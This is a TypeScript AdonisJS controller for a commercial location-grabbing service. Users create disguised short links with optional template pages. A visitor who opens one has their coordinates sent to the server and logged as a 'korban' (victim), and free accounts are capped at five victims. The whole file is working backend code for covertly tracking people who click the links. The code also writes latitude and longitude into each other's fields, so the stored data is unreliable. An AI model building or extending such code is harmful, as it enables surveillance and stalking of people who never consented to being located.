import type { HttpContextContract } from '@ioc:Adonis/Core/HttpContext'
import Database from '@ioc:Adonis/Lucid/Database';
import Link from 'App/Models/Link';
import Result from 'App/Models/Result';
import Template from 'App/Models/Template';

export default class WebsController {

    private randomString(len) {
        var str = "",
          i = 0,
          min =  0,
          max =  62;
        for (; i++ < len;) {
          var r = Math.random() * (max - min) + min << 0;
          str += String.fromCharCode(r += r > 9 ? r < 36 ? 55 : 61 : 48);
        }
        return str;
      }

    public async index({ view, session }: HttpContextContract) {
        const links = await Link.query().select('*',Database.raw('(select count(*) from results where link_id = links.id and is_delete = 0) as korban')).where('user_id', session.get('user').data.id).limit(10)
        const expired = new Date().setDate(new Date(session.get('user').data.created_at).getDate() + parseInt(session.get('user').data.expired))
        if (new Date(expired) < new Date()) {
            return 'Anda sudah kadaluarsa';
        }        
        return view.render('index', { links: links, expired: expired });
    }

    public async createLink({ view, }: HttpContextContract) {
        const templates = await Template.all()
        return view.render('create', { templates: templates });
    }

    public async createLinkPost({ request, session, response }: HttpContextContract) {
        
        if (session.get('user').data.is_vip == 0) {
            const link = await Link.query().where('user_id', session.get('user').data.id).count('* as jumlah').exec()
            if (link[0].$extras.jumlah >= '1') {
                session.flash({ error: 'Anda hanya bisa membuat 1 link' })
                return response.redirect('/');
            }
        } 
        await Link.create({
            judul: request.input('judul'),
            url: request.input('url'),
            kode: this.randomString(6),
            user_id: session.get('user').data.id,
            is_template: request.input('is_template') == '1' ? true : false,
            template_id: request.input('template_id') == '' ? null : request.input('template_id'),
        });
        return response.redirect().toPath('/') 
    }

    public async deleteLink({ params, session, response }: HttpContextContract) {
        const link = await Link.find(params.id)
        if (link?.user_id != session.get('user').data.id) {
            return response.redirect('/');
        }
        await link?.delete()
        return response.redirect('/')
    }

    public async editLink({ params, view, session, response }: HttpContextContract) {
        const link = await Link.find(params.id)
        if (link?.user_id != session.get('user').data.id) {
            return response.redirect('/');
        }
        return view.render('edit', { link: link });
    }

    public async editLinkPost({ params, request, session, response }: HttpContextContract) {
        const link = await Link.find(params.id)
        if (link?.user_id != session.get('user').data.id) {
            return response.redirect('/');
        }

        await Link.query().where('id', params.id).update({
            judul: request.input('judul'),
            url: request.input('url'),
        });
        return response.redirect('/')
    }

    public async korban({ params, view, session }: HttpContextContract) {
        const results = await Result.query().where('link_id', params.id).where('user_id', session.get('user').data.id).where('is_delete', 0).exec()
        return view.render('korban', { results: results });
    }
    
    public async redirect({ params, response, view }: HttpContextContract) {
        const link = await Link.findBy('kode', params.kode)
        const template = !link?.is_template ? null : await Template.find(link?.template_id)
        if (link?.kode != params.kode) {
            return response.redirect('/');
        }
        return view.render('redirect', { url: link?.url, is_template: link?.is_template, template: template });
    }

    public async redirectPost({ params, request, response }: HttpContextContract) {
        const link = await Link.findBy('kode', params.kode)
        await link?.load('user');
        if(!link?.user.$original.is_vip) {
            if (await (await Result.query().where('user_id', link?.user.$original.id)).length === 5) {
                return response.json({ error: 'Anda sudah mencapai batas korban' })
            }                
        }

        const results = new Result()
        if (link?.kode != params.kode) {
            return response.redirect('/');
        }
        results.user_id = link?.user_id;
        results.latitude = request.input('lng');
        results.longtitude = request.input('lat');
        await link?.related('results').save(results);
        
        return response.json({
                    status: 'success',
                })
    }

}
